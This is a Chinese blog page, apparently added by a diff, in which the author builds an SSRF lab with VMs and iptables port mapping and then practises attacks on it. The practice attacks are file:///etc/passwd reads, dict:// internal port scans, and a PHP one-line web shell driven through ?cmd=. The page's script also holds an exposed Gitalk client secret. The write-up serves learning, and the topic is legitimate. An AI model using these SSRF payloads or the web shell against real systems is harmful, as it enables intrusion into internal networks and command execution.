@@ -1,0 +1,723 @@
+<!DOCTYPE html>
+
+
+<html lang="zh-CN">
+  
+
+    <head>
+      <meta charset="utf-8" />
+        
+      <meta
+        name="viewport"
+        content="width=device-width, initial-scale=1, maximum-scale=1"
+      />
+      <title>内网场景搭建 |  小张之栈</title>
+  <meta name="generator" content="hexo-theme-ayer">
+      
+      <link rel="shortcut icon" href="/favicon.ico" />
+       
+<link rel="stylesheet" href="/dist/main.css">
+
+      
+<link rel="stylesheet" href="/css/fonts/remixicon.css">
+
+      
+<link rel="stylesheet" href="/css/custom.css">
+ 
+      <script src="https://cdn.staticfile.org/pace/1.2.4/pace.min.js"></script>
+       
+ 
+
+      <link
+        rel="stylesheet"
+        href="https://cdn.jsdelivr.net/npm/@sweetalert2/theme-bulma@5.0.1/bulma.min.css"
+      />
+      <script src="https://cdn.jsdelivr.net/npm/sweetalert2@11.0.19/dist/sweetalert2.min.js"></script>
+
+      <!-- mermaid -->
+      
+      <style>
+        .swal2-styled.swal2-confirm {
+          font-size: 1.6rem;
+        }
+      </style>
+    </head>
+  </html>
+</html>
+
+
+<body>
+  <div id="app">
+    
+      <canvas class="fireworks"></canvas>
+      <style>
+        .fireworks {
+          position: fixed;
+          left: 0;
+          top: 0;
+          z-index: 99999;
+          pointer-events: none;
+        }
+      </style>
+      
+      
+    <main class="content on">
+      <section class="outer">
+  <article
+  id="post-搭建-ssrf"
+  class="article article-type-post"
+  itemscope
+  itemprop="blogPost"
+  data-scroll-reveal
+>
+  <div class="article-inner">
+  
+    
+    <header class="article-header">
+       
+<h1 class="article-title sea-center" style="border-left:0" itemprop="name">
+  内网场景搭建
+</h1>
+ 
+
+      
+    </header>
+     
+    <div class="article-meta">
+      <a href="/2024/02/02/%E6%90%AD%E5%BB%BA-ssrf/" class="article-date">
+  <time datetime="2024-02-02T04:31:30.000Z" itemprop="datePublished">2024-02-02</time>
+</a> 
+  <div class="article-category">
+    <a class="article-category-link" href="/categories/%E9%9D%B6%E5%9C%BA/">靶场</a>
+  </div>
+  
+<div class="word_count">
+    <span class="post-time">
+        <span class="post-meta-item-icon">
+            <i class="ri-quill-pen-line"></i>
+            <span class="post-meta-item-text"> 字数统计:</span>
+            <span class="post-count">2.2k</span>
+        </span>
+    </span>
+
+    <span class="post-time">
+        &nbsp; | &nbsp;
+        <span class="post-meta-item-icon">
+            <i class="ri-book-open-line"></i>
+            <span class="post-meta-item-text"> 阅读时长≈</span>
+            <span class="post-count">9 分钟</span>
+        </span>
+    </span>
+</div>
+ 
+    </div>
+      
+    <div class="tocbot"></div>
+
+
+
+
+  
+    <div class="article-entry" itemprop="articleBody">
+       
+  <h1 id="目的"><a href="#目的" class="headerlink" title="目的"></a>目的</h1><p>为了更好地熟悉ssrf</p>
+<h1 id="需求"><a href="#需求" class="headerlink" title="需求"></a>需求</h1><p>根据<a target="_blank" rel="noopener" href="https://github.com/sqlsec/ssrf-vuls/tree/main%E7%9A%84%E9%9D%B6%E5%9C%BA%E6%8B%93%E6%89%91%E5%9B%BE%E6%90%AD%E5%BB%BA">https://github.com/sqlsec/ssrf-vuls/tree/main的靶场拓扑图搭建</a></p>
+<p>搭建需求：目标机存在ssrf漏洞，有一个公网映射80:8080，而与目标机同局域网下的其它内网有各自的漏洞</p>
+<h1 id="搭建思路"><a href="#搭建思路" class="headerlink" title="搭建思路"></a>搭建思路</h1><p>由于电脑配置原因，我这里选择只搞两个虚拟机，一个为目标机，另一个作为可替换的局域网机</p>
+<h2 id="问题：对目标机如何进行端口映射"><a href="#问题：对目标机如何进行端口映射" class="headerlink" title="问题：对目标机如何进行端口映射"></a>问题：对目标机如何进行端口映射</h2><p><strong>思路1：</strong></p>
+<p>常见的端口映射需要用到路由器的端口转发功能；</p>
+<p>虚拟机这里，emmm多加张网卡</p>
+<p>首先配置内部局域网网段</p>
+<p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20240202124820733.png"></p>
+<p>对于目标机而言，第一块网卡，选VMnet3(172.x)，第二块网卡选桥接(作为外网192.x，即与攻击机同网段)</p>
+<p>接下来是尝试将<strong>172.x:80到192.x:8080</strong></p>
+<p>因为一般来讲的端口映射，貌似都是单ip的多端口映射</p>
+<p>所以这里缺一个方法，使得双ip之间映射</p>
+<p>端口映射有三种情况嘛：1.动态公网IP(DDNS)；2.内网穿透(无公网IP)；3.直接绑定(有固定公网IP)</p>
+<p><strong>思路2：</strong></p>
+<p>这里考虑<strong>内网穿透</strong></p>
+<p>因为考虑到目标机既能被外网访问，又做了个端口映射。</p>
+<p>这个目标机我可以由两个机子组成，内网A，外网B；用<strong>proxychains</strong>或者其它**内网穿透工具(frp、nat123)**将这两个机器(网卡)映射一下即可；这样就是访问B的8080端口，就相当于访问了A的80端口的目的了；当然更通俗地理解，可以买个vps直接当公网</p>
+<p><strong>思路3</strong>：</p>
+<p>有没有一种可能，思路2也是思路1的解决方案之一呢？</p>
+<p>为了解决思路1的问题，</p>
+<p><strong>iptables</strong>可以配置一下</p>
+<p>那中间件<strong>nginx</strong>配置一下</p>
+<p><strong>apache</strong>是否可以配置一下呢</p>
+<h1 id="ip设置"><a href="#ip设置" class="headerlink" title="ip设置"></a>ip设置</h1><p>在那之前，把配置搞好，我centos的两个网卡有问题，需要手动配置一遍</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cd /etc/sysconfig/network-scripts/</span><br><span class="line">#将ifcfg-*的设置一下，我为了方便，用dhcp模式，不静态了，因为两张网卡我有点分不清哪个是外网内网，让它自己分配</span><br></pre></td></tr></table></figure>
+
+<p>最终配置如下：(centos可以ping通<a target="_blank" rel="noopener" href="http://www.baidu即可/">www.baidu即可</a>)</p>
+<table>
+<thead>
+<tr>
+<th>机器</th>
+<th>内网</th>
+<th>外网</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>目标机</td>
+<td>172.72.23.21</td>
+<td>192.168.1.99</td>
+</tr>
+<tr>
+<td>攻击机</td>
+<td></td>
+<td>192.168.1.142</td>
+</tr>
+<tr>
+<td></td>
+<td></td>
+<td></td>
+</tr>
+</tbody></table>
+<p>我之前装过<strong>xampp</strong>的，然后物理机访问一下</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.1.99/dashboard/ #出现xampp默认页面，没问题</span><br><span class="line">靶机呢，自己用内网ip访问也没问题</span><br></pre></td></tr></table></figure>
+
+<p>但是呢，要搞成如下效果</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.1.99:8080 ，实则是访问 http://172.72.23.21</span><br></pre></td></tr></table></figure>
+
+<p>这里还牵扯到apache配置，慢慢来，(nginx代理会不会更好一点)</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">/opt/lampp/apache2/conf/httpd.conf</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">#sudo /opt/lampp/lampp restartapache</span><br><span class="line">sudo /opt/lampp/bin/apachectl restart</span><br></pre></td></tr></table></figure>
+
+<p>iptables实现一个NAT转发功能</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># echo 1 &gt; /proc/sys/net/ipv4/ip_forward #不需要</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#iptables使用示例</span></span><br><span class="line">PREROUTING 链中的规则可以用于修改数据包的目标地址（Destination Address），进行端口转发（Port Forwarding）等操作。</span><br><span class="line">iptables -t nat -A PREROUTING -d 172.72.23.21 -p tcp --dport 80 -j DNAT --to-destination 192.168.1.99:8080</span><br><span class="line"></span><br><span class="line">iptables -t nat -D PREROUTING -p tcp --dport 80 -d 172.72.23.21 -j DNAT --to-destination 192.168.1.99:8080</span><br><span class="line"></span><br><span class="line">iptables -t nat -A POSTROUTING -d 192.168.1.99 -p tcp --dport 8080 -j SNAT --to 172.72.23.21</span><br><span class="line"></span><br><span class="line">iptables -t nat -D POSTROUTING -d 192.168.1.99 -p tcp --dport 8080 -j SNAT --to 172.72.23.21</span><br><span class="line"></span><br><span class="line"><span class="comment">#临时保存</span></span><br><span class="line">iptables -t nat -A PREROUTING -p tcp -d 192.168.1.99 --dport 8080 -j DNAT --to-destination 172.72.23.21:80</span><br><span class="line">将去往 IP 地址为 192.168.1.99、目标端口为 8080 的 TCP 流量进行目标地址转换 (DNAT)，将其转发到 IP 地址为 172.72.23.21 的目标服务器的端口 80。</span><br><span class="line"></span><br><span class="line">iptables -t nat -D PREROUTING -p tcp -d 192.168.1.99 --dport 8080 -j DNAT --to-destination 172.72.23.21:80</span><br><span class="line"></span><br><span class="line">sudo iptables -t nat -L -n</span><br><span class="line">iptables -nvL --line-number</span><br><span class="line"><span class="comment">#</span></span><br><span class="line">target     prot opt <span class="built_in">source</span>               destination         </span><br><span class="line">DNAT       tcp  --  192.168.1.99         0.0.0.0/0            tcp dpt:8080 to:172.72.23.21:80</span><br><span class="line"></span><br><span class="line"><span class="comment">#开放端口</span></span><br><span class="line">iptables -A INPUT -p tcp -d 192.168.1.0/24 --dport 8080 -j ACCEPT</span><br><span class="line">iptables -A INPUT -p tcp -d 192.168.1.0/24 --dport 80 -j DROP</span><br></pre></td></tr></table></figure>
+
+<p>搞了半天，xampp的配置文件，在**&#x2F;opt&#x2F;lampp&#x2F;etc&#x2F;httpd.conf**里，虽然该文件可以包含apache2&#x2F;httpd.conf的内容，但是配置不当会冲突，比如导致权限问题</p>
+<p>分析一下，首先，该文件监听80端口的，不考虑iptables的情况下，任何主机对两个ip的访问都是从80端口进入的；如果要实现对ip2的8080端口访问，那就可以Listen ip:8080，但这样不符合公网的端口映射思想；</p>
+<p>对配置文件进行，Require ip 172.x&#x2F;24的话，是限制了来源ip的访问；我的目的是将对目标ip2:8080的访问，转移到ip1:80；这一点iptables已经做到了；</p>
+<p>剩下的是只允许访问192.168.1.99的8080端口，那就是iptables做个drop即可吧</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">iptables -A INPUT -p tcp -d 192.168.1.0/24 --dport 8080 -j ACCEPT</span><br><span class="line">iptables -A INPUT -p tcp -d 192.168.1.0/24 --dport 80 -j DROP</span><br><span class="line">iptables -t nat -A PREROUTING -p tcp -d 192.168.1.99 --dport 8080 -j DNAT --to-destination 172.72.23.21:80</span><br><span class="line"></span><br><span class="line">iptables -A INPUT -p tcp --dport 22 -j ACCEPT</span><br><span class="line">/opt/lampp/etc/httpd.conf 更改位置</span><br><span class="line">/home/aaa/web/172.72.23.22-CodeExec</span><br><span class="line">/home/xg/web/172.72.23.22-CodeExec</span><br><span class="line">/home/xg/ssrf-vuls-main/172.72.23.21-SSRF</span><br><span class="line"></span><br><span class="line">sudo /opt/lampp/lampp restartapache</span><br></pre></td></tr></table></figure>
+
+<h1 id="一、ssrf"><a href="#一、ssrf" class="headerlink" title="一、ssrf"></a>一、ssrf</h1><p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20240207171235451.png" alt="公网页面"></p>
+<p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20240207174453876.png" alt="内网站点"></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">file:///etc/passwd <span class="comment">#是有东西出来的</span></span><br><span class="line"></span><br><span class="line">抓包是这样的：有个url参数</span><br><span class="line">url=http%3A%2F%2F127.0.0.1%2Fdashboard</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#dict/http协议爆破端口</span></span><br><span class="line">dict://127.0.0.1:22 <span class="comment">#得到22端口信息</span></span><br><span class="line">SSH-2.0-OpenSSH_7.4</span><br><span class="line">Protocol mismatch.</span><br><span class="line"></span><br><span class="line">dict://127.0.0.1:80</span><br><span class="line">HTTP/1.1 400 Bad Request</span><br><span class="line"></span><br><span class="line"><span class="comment">#http内网文件探测</span></span><br><span class="line">http://127.0.0.1/dashboard/ <span class="comment">#显示内容为xampp默认文件内容</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#内网段探测</span></span><br><span class="line">file:///etc/hosts <span class="comment">#一般是会显示配置的网段信息的，我这里没配，只有127.0.0.1，假设已知172.72.23.21了</span></span><br></pre></td></tr></table></figure>
+
+<p>进一步利用，继续用dict协议，爆破C段和端口(可以用到bp)</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">dict://172.72.23.?:? 用bp遍历即可</span><br><span class="line">dict://172.72.23.22:80 <span class="comment">#报错400</span></span><br><span class="line">http://172.72.23.22:80 <span class="comment">#是访问到了22的原内容的</span></span><br><span class="line">Hello CodeExec</span><br><span class="line">可以进一步扫描php文件，这个内容是一个代码执行的网站，即shell.php</span><br><span class="line"></span><br><span class="line">http://172.72.23.22:80/shell.php <span class="comment">#比如扫到了一个文件，可以看它的参数</span></span><br><span class="line">&lt;?php</span><br><span class="line">highlight_file(__FILE__); </span><br><span class="line">error_reporting(0);</span><br><span class="line"></span><br><span class="line">system(<span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>]);</span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line">http://172.72.23.22:80/shell.php?cmd=<span class="built_in">ls</span></span><br><span class="line">http://172.72.23.22:80/shell.php?cmd=<span class="built_in">cat</span>%09flag</span><br></pre></td></tr></table></figure>
+
+<p>其它的就类推下去了</p>
+<p>在这里主要是熟悉一下传说中的gopher协议</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">在网页中</span><br><span class="line">http://192.168.1.142:1332/abc</span><br><span class="line">在nc.py文件中</span><br><span class="line">PS E:\VS project\py&gt; python nhash.py -l 1332</span><br><span class="line">[ncat]# whoami</span><br><span class="line">GET /abc HTTP/1.1       </span><br><span class="line">Host: 192.168.1.142:1332</span><br><span class="line">Accept: */*</span><br></pre></td></tr></table></figure>
+
+<p>我电脑卡死了，接下来口嗨</p>
+<p>gopher以后再用，参考下面的链接，貌似是用来打redis、mysql的</p>
+<p><a target="_blank" rel="noopener" href="http://t.csdnimg.cn/bnmnl">http://t.csdnimg.cn/bnmnl</a></p>
+<h1 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h1><p>端口映射 <a target="_blank" rel="noopener" href="https://blog.csdn.net/suswulongyuan/article/details/106737145">https://blog.csdn.net/suswulongyuan/article/details/106737145</a></p>
+<p>iptables端口映射 <a target="_blank" rel="noopener" href="http://t.csdnimg.cn/QNnrB">http://t.csdnimg.cn/QNnrB</a></p>
+<p>centos7 ip配置 <a target="_blank" rel="noopener" href="http://t.csdnimg.cn/OTJLY">http://t.csdnimg.cn/OTJLY</a></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">cd /etc/sysconfig/network-scripts/</span><br><span class="line"></span><br><span class="line">ip addr</span><br><span class="line"></span><br><span class="line">service network restart	# 重启网络服务</span><br></pre></td></tr></table></figure>
+
+<p>vm添加网卡，但centos并无该文件 <a target="_blank" rel="noopener" href="http://t.csdnimg.cn/aIYwb">http://t.csdnimg.cn/aIYwb</a></p>
+<blockquote>
+<p>nmtui命令进行添加</p>
+<p>nmcli con show</p>
+</blockquote>
+<p>centos桥接上不了网：<a target="_blank" rel="noopener" href="http://t.csdnimg.cn/O49a6">http://t.csdnimg.cn/O49a6</a></p>
+<blockquote>
+<p>vmet0选定桥接网卡</p>
+</blockquote>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">XAMPP: Stopping Apache...fail.</span><br><span class="line">考虑是本机有一个apache占用了</span><br><span class="line">或者是 Listen 和&lt;Virtualhost&gt;的冲突</span><br></pre></td></tr></table></figure>
+
+<p>内外网iptables <a target="_blank" rel="noopener" href="https://blog.csdn.net/boyemachao/article/details/107059329">https://blog.csdn.net/boyemachao/article/details/107059329</a></p>
+<p>iptables 操作手册 <a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_35642637/article/details/112617332">https://blog.csdn.net/weixin_35642637/article/details/112617332</a></p>
+<p><a target="_blank" rel="noopener" href="http://t.csdnimg.cn/J7fuu">http://t.csdnimg.cn/J7fuu</a></p>
+<p>克隆虚拟机引起的冲突问题 <a target="_blank" rel="noopener" href="http://t.csdnimg.cn/HpqPF">http://t.csdnimg.cn/HpqPF</a></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">关掉方法:</span><br><span class="line"></span><br><span class="line">systemctl stop NetworkManager</span><br><span class="line"></span><br><span class="line">systemctl disable NetworkManager</span><br><span class="line"></span><br><span class="line">重新启动网络：</span><br><span class="line"></span><br><span class="line">systemctl start network.service</span><br></pre></td></tr></table></figure>
+
+
+
+<h1 id="问题记录"><a href="#问题记录" class="headerlink" title="问题记录"></a>问题记录</h1><p><strong>1.没配置前，物理机可以通过ip访问到xampp内容；配置后，403页面了</strong></p>
+<p>在这里的配置我只用了<code>apache2/conf/httpd.conf</code>，物理机是可以ping通虚拟机的</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">/bin/apachectl restart</span><br><span class="line">xampp重启</span><br><span class="line">...</span><br><span class="line">我笑了，我挂了代理；但显示访问被拒绝</span><br><span class="line">iptables开放80端口；不行</span><br><span class="line">systemctl stop firewalld；显示响应时间过长 #sudo systemctl stop firewalld重新启用</span><br><span class="line">哦，xampp服务没有启用，6</span><br><span class="line">好好好，apache2/conf/httpd.conf配置有问题(虽然我没看出来，我把内容全部注释掉了)，和/opt/lampp/etc/httpd.conf冲突了</span><br></pre></td></tr></table></figure>
+
+
+
+<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>配置前没意识到的问题都不算问题，只有在配置的后，再简单的东西也会出错，嘶，多实践，多想，多思考为什么；</p>
+<p>学到搭配这个东西就很好了，其它的都是基础知识，对ssrf进行内网探测更熟练一点</p>
+<p>端口探测-&gt;http协议尝试访问-&gt;尝试访问其它内网ip，目录扫描等-&gt;以便寻找薄弱点</p>
+ 
+      <!-- reward -->
+      
+    </div>
+    
+
+    <!-- copyright -->
+    
+    <div class="declare">
+      <ul class="post-copyright">
+        <li>
+          <i class="ri-copyright-line"></i>
+          <strong>版权声明： </strong>
+          
+          本博客所有文章除特别声明外，著作权归作者所有。转载请注明出处！
+          
+        </li>
+      </ul>
+    </div>
+    
+    <footer class="article-footer">
+       
+<div class="share-btn">
+      <span class="share-sns share-outer">
+        <i class="ri-share-forward-line"></i>
+        分享
+      </span>
+      <div class="share-wrap">
+        <i class="arrow"></i>
+        <div class="share-icons">
+          
+          <a class="weibo share-sns" href="javascript:;" data-type="weibo">
+            <i class="ri-weibo-fill"></i>
+          </a>
+          <a class="weixin share-sns wxFab" href="javascript:;" data-type="weixin">
+            <i class="ri-wechat-fill"></i>
+          </a>
+          <a class="qq share-sns" href="javascript:;" data-type="qq">
+            <i class="ri-qq-fill"></i>
+          </a>
+          <a class="douban share-sns" href="javascript:;" data-type="douban">
+            <i class="ri-douban-line"></i>
+          </a>
+          <!-- <a class="qzone share-sns" href="javascript:;" data-type="qzone">
+            <i class="icon icon-qzone"></i>
+          </a> -->
+          
+          <a class="facebook share-sns" href="javascript:;" data-type="facebook">
+            <i class="ri-facebook-circle-fill"></i>
+          </a>
+          <a class="twitter share-sns" href="javascript:;" data-type="twitter">
+            <i class="ri-twitter-fill"></i>
+          </a>
+          <a class="google share-sns" href="javascript:;" data-type="google">
+            <i class="ri-google-fill"></i>
+          </a>
+        </div>
+      </div>
+</div>
+
+<div class="wx-share-modal">
+    <a class="modal-close" href="javascript:;"><i class="ri-close-circle-line"></i></a>
+    <p>扫一扫，分享到微信</p>
+    <div class="wx-qrcode">
+      <img src="//api.qrserver.com/v1/create-qr-code/?size=150x150&data=http://example.com/2024/02/02/%E6%90%AD%E5%BB%BA-ssrf/" alt="微信分享二维码">
+    </div>
+</div>
+
+<div id="share-mask"></div>  
+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/ssrf/" rel="tag">ssrf</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E5%86%85%E7%BD%91/" rel="tag">内网</a></li></ul>
+
+    </footer>
+  </div>
+
+   
+  <nav class="article-nav">
+    
+    
+      <a href="/2024/01/03/%E4%B8%80%E7%82%B9%E6%96%B0%E6%8A%80%E5%B7%A7/" class="article-nav-link">
+        <strong class="article-nav-caption">下一篇</strong>
+        <div class="article-nav-title">新技巧学习</div>
+      </a>
+    
+  </nav>
+
+  
+   
+<div class="gitalk" id="gitalk-container"></div>
+
+<link rel="stylesheet" href="https://cdn.staticfile.org/gitalk/1.7.2/gitalk.min.css">
+
+
+<script src="https://cdn.staticfile.org/gitalk/1.7.2/gitalk.min.js"></script>
+
+
+<script src="https://cdn.staticfile.org/blueimp-md5/2.19.0/js/md5.min.js"></script>
+
+<script type="text/javascript">
+  var gitalk = new Gitalk({
+    clientID: '93da8388ad1469a8be66',
+    clientSecret: '9dea6314b14ae1877632f2bcbe0a639dd4485bb1',
+    repo: 'blogtalk',
+    owner: 'ak005469075',
+    admin: ['ak005469075'],
+    // id: location.pathname,      // Ensure uniqueness and length less than 50
+    id: md5(location.pathname),
+    distractionFreeMode: false,  // Facebook-like distraction free mode
+    pagerDirection: 'last'
+  })
+
+  gitalk.render('gitalk-container')
+</script>
+
+  
+    
+</article>
+
+</section>
+      <footer class="footer">
+  <div class="outer">
+    <ul>
+      <li>
+        Copyrights &copy;
+        2023-2024
+        <i class="ri-heart-fill heart_icon"></i> 是羽泪云诶
+      </li>
+    </ul>
+    <ul>
+      <li>
+        
+      </li>
+    </ul>
+    <ul>
+      <li>
+        
+        
+        <span>
+  <span><i class="ri-user-3-fill"></i>访问人数:<span id="busuanzi_value_site_uv"></span></span>
+  <span class="division">|</span>
+  <span><i class="ri-eye-fill"></i>浏览次数:<span id="busuanzi_value_page_pv"></span></span>
+</span>
+        
+      </li>
+    </ul>
+    <ul>
+      
+    </ul>
+    <ul>
+      
+    </ul>
+    <ul>
+      <li>
+        <!-- cnzz统计 -->
+        
+        <script type="text/javascript" src='https://s9.cnzz.com/z_stat.php?id=1278069914&amp;web_id=1278069914'></script>
+        
+      </li>
+    </ul>
+  </div>
+</footer>    
+    </main>
+    <div class="float_btns">
+      <div class="totop" id="totop">
+  <i class="ri-arrow-up-line"></i>
+</div>
+
+<div class="todark" id="todark">
+  <i class="ri-moon-line"></i>
+</div>
+
+    </div>
+    <aside class="sidebar on">
+      <button class="navbar-toggle"></button>
+<nav class="navbar">
+  
+  <div class="logo">
+    <a href="/"><img src="/favicon.ico" alt="小张之栈"></a>
+  </div>
+  
+  <ul class="nav nav-main">
+    
+    <li class="nav-item">
+      <a class="nav-item-link" href="/">主页</a>
+    </li>
+    
+    <li class="nav-item">
+      <a class="nav-item-link" href="/archives">归档</a>
+    </li>
+    
+    <li class="nav-item">
+      <a class="nav-item-link" href="/categories">分类</a>
+    </li>
+    
+    <li class="nav-item">
+      <a class="nav-item-link" href="/tags">标签</a>
+    </li>
+    
+    <li class="nav-item">
+      <a class="nav-item-link" href="/about">关于我</a>
+    </li>
+    
+  </ul>
+</nav>
+<nav class="navbar navbar-bottom">
+  <ul class="nav">
+    <li class="nav-item">
+      
+      <a class="nav-item-link nav-item-search"  title="搜索">
+        <i class="ri-search-line"></i>
+      </a>
+      
+      
+    </li>
+  </ul>
+</nav>
+<div class="search-form-wrap">
+  <div class="local-search local-search-plugin">
+  <input type="search" id="local-search-input" class="local-search-input" placeholder="Search...">
+  <div id="local-search-result" class="local-search-result"></div>
+  <script type="text/javascript">
+$(function () {
+    console.log("lets go！");
+    console.log("/");
+    searchFunc("/" + "search.xml", 'searchInput', 'searchResult');
+});
+</script>
+</div>
+
+</div>
+    </aside>
+    <div id="mask"></div>
+
+<!-- #reward -->
+<div id="reward">
+  <span class="close"><i class="ri-close-line"></i></span>
+  <p class="reward-p"><i class="ri-cup-line"></i>请我喝杯咖啡吧~</p>
+  <div class="reward-box">
+    
+    <div class="reward-item">
+      <img class="reward-img" src="/images/alipay.jpg">
+      <span class="reward-type">支付宝</span>
+    </div>
+    
+    
+    <div class="reward-item">
+      <img class="reward-img" src="/images/wechat.jpg">
+      <span class="reward-type">微信</span>
+    </div>
+    
+  </div>
+</div>
+    
+<script src="/js/jquery-3.6.0.min.js"></script>
+ 
+<script src="/js/lazyload.min.js"></script>
+
+<!-- Tocbot -->
+ 
+<script src="/js/tocbot.min.js"></script>
+
+<script>
+  tocbot.init({
+    tocSelector: ".tocbot",
+    contentSelector: ".article-entry",
+    headingSelector: "h1, h2, h3, h4, h5, h6",
+    hasInnerContainers: true,
+    scrollSmooth: true,
+    scrollContainer: "main",
+    positionFixedSelector: ".tocbot",
+    positionFixedClass: "is-position-fixed",
+    fixedSidebarOffset: "auto",
+  });
+</script>
+
+<script src="https://cdn.staticfile.org/jquery-modal/0.9.2/jquery.modal.min.js"></script>
+<link
+  rel="stylesheet"
+  href="https://cdn.staticfile.org/jquery-modal/0.9.2/jquery.modal.min.css"
+/>
+<script src="https://cdn.staticfile.org/justifiedGallery/3.8.1/js/jquery.justifiedGallery.min.js"></script>
+
+<script src="/dist/main.js"></script>
+
+<!-- ImageViewer -->
+ <!-- Root element of PhotoSwipe. Must have class pswp. -->
+<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
+
+    <!-- Background of PhotoSwipe. 
+         It's a separate element as animating opacity is faster than rgba(). -->
+    <div class="pswp__bg"></div>
+
+    <!-- Slides wrapper with overflow:hidden. -->
+    <div class="pswp__scroll-wrap">
+
+        <!-- Container that holds slides. 
+            PhotoSwipe keeps only 3 of them in the DOM to save memory.
+            Don't modify these 3 pswp__item elements, data is added later on. -->
+        <div class="pswp__container">
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+        </div>
+
+        <!-- Default (PhotoSwipeUI_Default) interface on top of sliding area. Can be changed. -->
+        <div class="pswp__ui pswp__ui--hidden">
+
+            <div class="pswp__top-bar">
+
+                <!--  Controls are self-explanatory. Order can be changed. -->
+
+                <div class="pswp__counter"></div>
+
+                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+
+                <button class="pswp__button pswp__button--share" style="display:none" title="Share"></button>
+
+                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+
+                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
+
+                <!-- Preloader demo http://codepen.io/dimsemenov/pen/yyBWoR -->
+                <!-- element will get class pswp__preloader--active when preloader is running -->
+                <div class="pswp__preloader">
+                    <div class="pswp__preloader__icn">
+                        <div class="pswp__preloader__cut">
+                            <div class="pswp__preloader__donut"></div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
+                <div class="pswp__share-tooltip"></div>
+            </div>
+
+            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+            </button>
+
